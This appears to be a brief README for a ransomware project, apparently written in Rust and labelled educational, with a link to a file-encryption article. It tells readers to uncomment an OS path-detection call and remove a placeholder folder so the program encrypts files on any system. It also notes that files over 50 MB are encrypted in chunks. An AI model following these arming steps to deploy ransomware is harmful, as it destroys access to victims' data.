# A Ransomware

**EDUCATIONAL PURPORSES**

For security a line in the code is commented

`let path = "/home/folder_never_used"; //detect_os_path();`

Uncomment `detect_os_path()` and delete `"/home/folder_never_used"` for be usable in any os;

If the file size is greater that 50mb, the file will be encrypted into chunks.

[Source](https://kerkour.com/rust-file-encryption)